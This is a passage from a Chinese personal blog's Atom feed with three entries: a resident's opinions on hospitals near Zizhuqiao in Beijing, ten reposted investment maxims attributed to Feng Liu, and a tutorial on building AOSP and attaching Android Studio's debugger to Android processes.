    <content type="html"><![CDATA[<p>作为一个长期在帝都紫竹桥混吃的中年大叔，经常遇到需要看病的情况，主要需求有两个 （大人看病，小孩看病）。</p><p>总结附近医院情况，个人理解，供参考：</p><p>466:</p><p>缺点：没有儿科，巨贵，感觉医生喜欢过度治疗，据说一些科室已被私人承包，媳妇和自己都被坑过。<br>优点：离紫竹桥距离近，三甲，人通常比较少，小病，偷懒的时候可以过去。据说牙科不错，但是我没有去过。</p><p>304:</p><p>缺点：信息化程度相对较弱，但是看病流程梳理得不错。<br>优点：三甲，有儿科，对小儿看病有一定优待。医生水平不错，小孩在这看过几次，治疗效果不错。</p><p>现在304 改名为 解放军总医院第四医学中心，儿科的实力比以往有较大提升。</p><p>四季青：</p><p>缺点：二级医院，儿科有的医生感觉不太专业。<br>优点：挂号方便，有儿科，医院较大。</p><p>北方医院：</p><p>缺点：二级医院， 医院较小。<br>优点：离紫竹桥距离近，有保健科，小孩打预防针不错。</p><p>空总：</p><p>在这个医院多个科室看过病，家人还在这做过微创手术。</p><p>缺点：挂号有点难，人多，儿科水平一般。<br>优点：三甲，皮肤科北京有名，各科室水平比较均衡。信息化程度高，看病挺方便。</p><p>海总：</p><p>这个医院我没有去过，距离稍远。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;作为一个长期在帝都紫竹桥混吃的中年大叔，经常遇到需要看病的情况，主要需求有两个 （大人看病，小孩看病）。&lt;/p&gt;
&lt;p&gt;总结附近医院情况，个人理解，供参考：&lt;/p&gt;
&lt;p&gt;466:&lt;/p&gt;
&lt;p&gt;缺点：没有儿科，巨贵，感觉医生喜欢过度治疗，据说一些科室已被私人承包，媳妇和自</summary>
      
    
    
    
    
    <category term="Life" scheme="http://usmacd.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>【转】冯柳投资十大金句</title>
    <link href="http://usmacd.com/2021/06/28/fengliu/"/>
    <id>http://usmacd.com/2021/06/28/fengliu/</id>
    <published>2021-06-28T04:24:01.826Z</published>
    <updated>2021-06-28T04:24:01.826Z</updated>
    
    <content type="html"><![CDATA[<p>（一）经济的波动就像是剪羊毛，长好了就剪、剪完了再长。拿剪子的一般就是赢家，当然赢家之间也有互相剪的，所以就有大小赢家、长短赢家之分。</p><p>（二）技术分析主要是找出趋势和预期同向运动并强化的机会，价值分析则可以在反向运动但最终会被预期改变的机会上下注。</p><p>（三）各方面都完美的系统是不可能长期存在的，放弃效率和短期安全的系统往往才会是长期安全和可重复的。这不太符合人性，也就保证了系统的独特和有效性，也有利于将精力放在长期要素和战略点的思考上。</p><p>（四）涨跌都能令人坚定的才是好标的，跌令实的更实，因为价钱便宜了。涨令虚处显得确定，因为得到市场的确认和佐证了。这就是虚实结合带来的效果，如果涨几十个点就让人有想卖的感觉，那就说明虚处不足，就不太可能是好选择，最后也许连那几十个点也不容易挣到。反过来也是一样，跌了不敢重仓加的就说明实处不够，要多检讨下自己对确定性的把握能力。</p><p>（五）资产就是金钱在不同时间下的不同属性，本质就是现在的钱和未来的钱之间进行交换，买入是用现在换未来，卖出则是把未来换现在，关键要想明白未来和现在谁更值钱就好了。牛熊市就是这样的一个判断依据，当然，对极少数的优异公司来说，未来总是会强过现在的，这就是比牛熊大势更大的大势。</p><p>（六）市场在不断变化，企业也在不断变化，变化是常态，所以任何时候都要多方向的反复审视，对世界有敬畏心。这个敬畏就是要认识到事物总是在不断变化和出现意外的，所以要尽量让自己处于有保护的状态，尽量多的假设极端情况下的可靠性。</p><p>（七）当全世界都想通过股市来对抗通货膨胀的时候，也许拿着现金让其自然贬值会是更好的选择。除非你能找到明确的新增预期，否则凭什么指望别人以更高的价钱来购买已经给他人提供过保值机会的资产呢（房地产）。</p><p>（八）每个阶段的侧重点是不一样的。在高位的时候，我们要做计算题，要定量。因为一只股票涨了这么多、这么长时间，它的方向一定是没有问题的，这个时候你再去做定性研究意义不大。在低位的时候，如果你再去算账，就很容易吃大亏。它跌了这么久，那一定是方向上出了问题，你要把方向给想明白。如果能把方向证伪掉，是不需要考虑定量的问题，因为低位天然带有弹性和赔率。</p><p>（九）真正的投机应该是在价值的基础上进行的，是通过充分的价值理解后，将其在不同人群或环境下进行切换来获益。它认识到价值有主观倾向性和个性化的特点，价值不是个稳定具体的东西，也不存在用什么方法推算的公允值，因为资本以及资本后面的人是丰富不同的，他们有着不同的成本和收益预期，在各种市场环境下也会有着不同的预期因子和贴现率，而这些在乘数和复利计算的基础下就会有着巨大的差异。这也说明了为什么理性且信息充分对称的人之间也可以产生交易并实现双赢，其原因就在于他们有着不同的价值观、需求特点和满足感。</p><p>（十）长线投资很多人认为这是最容易做的，只要买进不动就可以了，其实这完全是误解。在所有的操作策略中，长线的要求最高。他需要对企业有着极为深刻的认识，对自己有着更为坚强的控制。他清楚把握企业未来数年的发展趋势，以投资的心态分享企业的成长。他的标的物是千里挑一，在这样的机会面前它不会惧怕任何亏损，不会设置除基本面外的任何止损指标。自信、尊重客观价值、不理会乃至勇于对抗市场是必备的投资品质，日常的波动在这样的前景面前是不应去考虑的。只有这样，股票才能够真正成为改变一生的东西。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;（一）经济的波动就像是剪羊毛，长好了就剪、剪完了再长。拿剪子的一般就是赢家，当然赢家之间也有互相剪的，所以就有大小赢家、长短赢家之分。&lt;/p&gt;
&lt;p&gt;（二）技术分析主要是找出趋势和预期同向运动并强化的机会，价值分析则可以在反向运动但最终会被预期改变的机会上下注。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>调试AOSP Java 代码</title>
    <link href="http://usmacd.com/2021/06/18/debug_aosp_java_code/"/>
    <id>http://usmacd.com/2021/06/18/debug_aosp_java_code/</id>
    <published>2021-06-18T01:56:42.523Z</published>
    <updated>2021-06-18T01:56:42.523Z</updated>
    
    <content type="html"><![CDATA[<p>下载 Android 源代码，编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">$ lunch</span><br><span class="line">$ make</span><br><span class="line">$ mmm development/tools/idegen/</span><br><span class="line">$ ./development/tools/idegen/idegen.sh</span><br></pre></td></tr></table></figure><p>运行后将生成下面几个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android.ipr (IntelliJ / Android Studio)</span><br><span class="line">android.iml (IntelliJ / Android Studio)</span><br><span class="line">.classpath  (Eclipse)</span><br></pre></td></tr></table></figure><ol><li>在Android Studio 中导入 android.ipr</li></ol><p>File -&gt; Open 选择 android.ipr, 导入后可以Android Studio 中浏览AOSP 源码</p><ol start="2"><li>设置远程调试配置文件</li></ol><p>Run -&gt; Edit Configuration 点击左上角的 + 类型选择 Remote</p><ol start="3"><li>Attack 到需要调试的进程</li></ol><p>这里有两种方法，一是使用SDK 提供的 Monitor 二是使用 Android Studio 自带的<br>Attach debugger to Android Process 按钮。 </p><p>连接成功后将看到 Connected to the target VM</p><ol start="4"><li>设置断点</li></ol><p>设置断点很简单，用鼠标点击源码文件的左边栏，看见红色圆点说明就已经设置成功了。也<br>可以使用Ctrl + F8 的快捷键。</p><ol start="5"><li>运行程序，触发断点</li></ol><p>需要注意的是在调试过程中会出现源码对不上的情况，需要自己选择正确的源码。关于哪些<br>进程可以调试的问题，上篇已经有记录，这里就不在说了。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li>AOSP Sources in the IDE<br><a href="https://newcircle.com/s/post/1720/aosp_sources_in_the_ide">https://newcircle.com/s/post/1720/aosp_sources_in_the_ide</a></li><li>Debugging AOSP Platform code with Android Studio - Part I - Java Debugger<br><a href="http://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html">http://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;下载 Android 源代码，编译&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;</summary>
      
    
    
    
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
  </entry>
  
</feed>
